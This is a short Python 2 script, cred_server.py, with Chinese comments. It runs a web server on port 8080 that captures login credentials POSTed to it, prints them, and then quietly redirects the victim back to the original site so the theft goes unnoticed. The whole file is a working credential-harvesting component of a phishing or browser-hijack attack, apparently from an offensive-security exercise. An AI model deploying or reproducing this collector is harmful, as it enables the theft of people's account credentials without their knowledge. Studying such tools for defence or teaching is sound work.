#-*- coding:utf8 -*-  

"""
@version: 
@author: giantbranch
@file: cred_server.py
@time: 2016/3/11 22:26
"""

import SimpleHTTPServer
import SocketServer
import urllib



class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    # 处理POST请求
    def do_POST(self):
        # 获取包长度
        content_length = int(self.headers['Content-Length'])
        # 读取这么多长度的内容并打印出来，登录凭证就出来了
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        # 跟着获取用户访问的原始站点，进行301重定向，并设置头部
        site = self.path[1:]
        self.send_response(301)
        self.send_header("Location",urllib.unquote(site))
        self.end_headers()

# 初始化监听地址和端口，并调用一个类来处理请求，其实就是处理POST请求
server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
# 永远监听
server.serve_forever()
